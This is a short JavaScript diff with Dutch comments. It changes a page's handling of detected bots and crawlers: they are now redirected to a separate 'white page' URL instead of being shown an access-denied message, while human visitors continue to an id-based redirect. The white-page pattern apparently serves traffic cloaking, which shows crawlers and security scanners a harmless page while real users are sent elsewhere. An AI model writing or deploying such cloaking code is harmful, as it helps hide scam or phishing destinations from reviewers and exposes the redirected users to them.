@@ -135,15 +135,19 @@
             console.log(`Platform: ${platform}`);
         }
 
+        // Functie voor redirect naar een specifieke pagina voor bots (WHITE_PAGE)
+        function redirectToWhitePage() {
+            const whitePage = 'https://badbotstraffic-to.here/';
+            window.location.href = whitePage;
+        }
+
         // Uitvoeren van logica bij het laden van de pagina
         document.addEventListener("DOMContentLoaded", () => {
             logUserAgentDetails(); // Roep de nieuwe functie aan
 
             if (isBot()) {
-                document.body.innerHTML = `
-                    <h1>Access Denied</h1>
-                    <p>Bot or Crawler detected.</p>
-                `;
+                // Redirect naar de witte pagina voor bots
+                redirectToWhitePage();
             } else {
                 setTimeout(() => {
                     redirectBasedOnId(); // Prioriteit aan 'id'-gebaseerde redirect
